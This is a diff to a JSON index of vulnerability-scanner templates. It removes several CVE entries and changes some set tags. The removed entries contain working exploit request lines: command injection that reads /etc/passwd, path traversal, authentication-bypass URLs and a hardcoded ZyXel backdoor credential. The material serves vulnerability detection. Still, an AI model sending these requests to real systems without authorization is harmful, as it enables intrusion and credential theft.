@@ -1,6 +1,6 @@
 {
   "version": "2026.11.5",
-  "sha256": "2cb60433ff803a9c2aa75b3f592ebf4d2efe2bd31939769f4b6083e1e376590b",
+  "sha256": "2eae07fa08011f85b8f8b818d334846b7c2499cdb935a50474aa583ce4f6d927",
   "templates": [
     {
       "id": "CNVD-2017-03561",
@@ -4358,7 +4358,6 @@
       ],
       "request": "GET {{BaseURL}}/reports/rwservlet/showenv",
       "sets": [
-        "kev",
         "deep"
       ],
       "name": "Oracle Forms \u0026 Reports RCE (CVE-2012-3152 \u0026 CVE-2012-3153)",
@@ -7641,28 +7640,6 @@
       "severity": "medium"
     },
     {
-      "id": "CVE-2017-7921",
-      "cve": "CVE-2017-7921",
-      "path": "http/cves/2017/CVE-2017-7921.yaml",
-      "sha256": "8406609a17a03f028753468929ce25c51319ba0078acba3622f9b4209fb77de4",
-      "tags": [
-        "cve",
-        "cve2017",
-        "auth-bypass",
-        "hikvision",
-        "vkev",
-        "vuln",
-        "kev"
-      ],
-      "request": "GET {{BaseURL}}/system/deviceInfo?auth=YWRtaW46MTEK",
-      "sets": [
-        "kev",
-        "deep"
-      ],
-      "name": "Hikvision - Authentication Bypass",
-      "severity": "critical"
-    },
-    {
       "id": "CVE-2017-7925",
       "cve": "CVE-2017-7925",
       "path": "http/cves/2017/CVE-2017-7925.yaml",
@@ -7806,29 +7783,6 @@
         "disruptive"
       ],
       "name": "DotNetNuke 5.0.0 - 9.3.0 - Cookie Deserialization Remote Code Execution",
-      "severity": "high"
-    },
-    {
-      "id": "CVE-2017-9833",
-      "cve": "CVE-2017-9833",
-      "path": "http/cves/2017/CVE-2017-9833.yaml",
-      "sha256": "507a9a5c6c6294aa95919a01cf8c0c877af487af12448cffc22195a0ed443a59",
-      "tags": [
-        "cve",
-        "cve2017",
-        "boa",
-        "lfr",
-        "lfi",
-        "edb",
-        "vkev",
-        "vuln"
-      ],
-      "request": "GET {{BaseURL}}/cgi-bin/wapopen?B1=OK\u0026NO=CAM_16\u0026REFRESH_TIME=Auto_00\u0026FILECAMERA=../../etc/passwd%00\u0026REFRESH_HTML=auto.htm\u0026ONLOAD_HTML=onload.htm\u0026STREAMING_HTML=streaming.htm\u0026NAME=admin\u0026PWD=admin\u0026PIC_S",
-      "sets": [
-        "kev",
-        "deep"
-      ],
-      "name": "BOA Web Server 0.94.14 - Arbitrary File Access",
       "severity": "high"
     },
     {
@@ -8250,31 +8204,6 @@
         "deep"
       ],
       "name": "D-Link Routers - Local File Inclusion",
-      "severity": "high"
-    },
-    {
-      "id": "CVE-2018-10823",
-      "cve": "CVE-2018-10823",
-      "path": "http/cves/2018/CVE-2018-10823.yaml",
-      "sha256": "2b4c6d0cae872addf55297574661208936744e145ff60ea863a454a420f51e1d",
-      "tags": [
-        "cve",
-        "cve2018",
-        "rce",
-        "iot",
-        "dlink",
-        "router",
-        "edb",
-        "seclists",
-        "vkev",
-        "vuln"
-      ],
-      "request": "GET {{BaseURL}}/chkisg.htm%3FSip%3D1.1.1.1%20%7C%20cat%20%2Fetc%2Fpasswd",
-      "sets": [
-        "kev",
-        "deep"
-      ],
-      "name": "D-Link Routers - Remote Command Injection",
       "severity": "high"
     },
     {
@@ -11519,30 +11448,6 @@
         "deep"
       ],
       "name": "Socomec DIRIS A-40 Devices Password Disclosure",
-      "severity": "critical"
-    },
-    {
-      "id": "CVE-2019-16057",
-      "cve": "CVE-2019-16057",
-      "path": "http/cves/2019/CVE-2019-16057.yaml",
-      "sha256": "13674d32d9abe1af9fda86e1147df457256acf5d7174c4935b772cc2b66b8af3",
-      "tags": [
-        "cve",
-        "cve2019",
-        "lfi",
-        "rce",
-        "kev",
-        "sharecenter",
-        "dlink",
-        "vkev",
-        "vuln"
-      ],
-      "request": "GET {{BaseURL}}/cgi-bin/login_mgr.cgi?C1=ON\u0026cmd=login\u0026f_type=1\u0026f_username=admin\u0026port=80%7Cpwd%26id\u0026pre_pwd=1\u0026pwd=%20\u0026ssl=1\u0026ssl_port=1\u0026username=",
-      "sets": [
-        "kev",
-        "deep"
-      ],
-      "name": "D-Link DNS-320 - Remote Code Execution",
       "severity": "critical"
     },
     {
@@ -15855,27 +15760,6 @@
       "severity": "medium"
     },
     {
-      "id": "CVE-2020-27866",
-      "cve": "CVE-2020-27866",
-      "path": "http/cves/2020/CVE-2020-27866.yaml",
-      "sha256": "a69b36bc13d303cf7a56af2c3e2a798418fd406ef8303bb157303bcf67506f6f",
-      "tags": [
-        "cve",
-        "cve2020",
-        "netgear",
-        "auth-bypass",
-        "vuln",
-        "vkev"
-      ],
-      "request": "GET /setup.cgi?todo=debug\u0026x=currentsetting.htm HTTP/1.1",
-      "sets": [
-        "kev",
-        "deep"
-      ],
-      "name": "NETGEAR - Authentication Bypass",
-      "severity": "high"
-    },
-    {
       "id": "CVE-2020-27982",
       "cve": "CVE-2020-27982",
       "path": "http/cves/2020/CVE-2020-27982.yaml",
@@ -16066,29 +15950,6 @@
         "disruptive"
       ],
       "name": "Zeroshell 3.9.3 - Command Injection",
-      "severity": "critical"
-    },
-    {
-      "id": "CVE-2020-29583",
-      "cve": "CVE-2020-29583",
-      "path": "http/cves/2020/CVE-2020-29583.yaml",
-      "sha256": "a2798bdd76f318d4bd801a8958c674209fd39845d73c29fa63a5b1e2fc43cbdc",
-      "tags": [
-        "cve",
-        "cve2020",
-        "ftp-backdoor",
-        "zyxel",
-        "bypass",
-        "kev",
-        "vkev",
-        "vuln"
-      ],
-      "request": "GET /?username=zyfwp\u0026password=PrOw!aN_fXp HTTP/1.1",
-      "sets": [
-        "kev",
-        "deep"
-      ],
-      "name": "ZyXel USG - Hardcoded Credentials",
       "severity": "critical"
     },
     {
@@ -26228,9 +26089,7 @@
         "vuln"
       ],
       "request": "GET {{BaseURL}}/wp-content/backups-dup-lite/dup-installer/main.installer.php?is_daws=1",
-      "own_ip": true,
       "sets": [
-        "kev",
         "deep"
       ],
       "name": "WordPress Duplicator \u003c1.4.7 - Authentication Bypass",
@@ -31375,31 +31234,6 @@
       ],
       "name": "GDidees CMS v3.9.1 - Arbitrary File Download",
       "severity": "high"
-    },
-    {
-      "id": "CVE-2023-2732",
-      "cve": "CVE-2023-2732",
-      "path": "http/cves/2023/CVE-2023-2732.yaml",
-      "sha256": "63476572f8c1cbc7d9d718ed571dd4830df7245483cd7574c1a6bfbac5ca0f0f",
-      "tags": [
-        "cve2023",
-        "cve",
-        "wordpress",
-        "wp",
-        "wp-plugin",
-        "auth-bypass",
-        "mstore-api",
-        "inspireui",
-        "vkev",
-        "vuln"
-      ],
-      "request": "GET /wp-json/wp/v2/add-listing?id=1 HTTP/1.1",
-      "sets": [
-        "kev",
-        "deep"
-      ],
-      "name": "MStore API \u003c= 3.9.2 - Authentication Bypass",
-      "severity": "critical"
     },
     {
       "id": "CVE-2023-27372",
@@ -41244,29 +41078,6 @@
       "severity": "high"
     },
     {
-      "id": "CVE-2025-13390",
-      "cve": "CVE-2025-13390",
-      "path": "http/cves/2025/CVE-2025-13390.yaml",
-      "sha256": "3de433e4dbfce0ca11711463ed05f7c7f4397ff716e2fa2913df631918743635",
-      "tags": [
-        "cve",
-        "cve2025",
-        "wordpress",
-        "wp",
-        "wp-plugin",
-        "auth-bypass",
-        "wpdirectorykit",
-        "vkev"
-      ],
-      "request": "GET /?auto-login=1\u0026user_id=1\u0026token=c4ca4238a0 HTTP/1.1",
-      "sets": [
-        "kev",
-        "deep"
-      ],
-      "name": "WP Directory Kit \u003c= 1.4.4 - Authentication Bypass",
-      "severity": "critical"
-    },
-    {
       "id": "CVE-2025-1361",
       "cve": "CVE-2025-1361",
       "path": "http/cves/2025/CVE-2025-1361.yaml",
@@ -45692,7 +45503,6 @@
       ],
       "request": "GET {{BaseURL}}/api/backup",
       "sets": [
-        "kev",
         "deep"
       ],
       "name": "Nginx UI \u003c 2.3.3 - Information Disclosure",
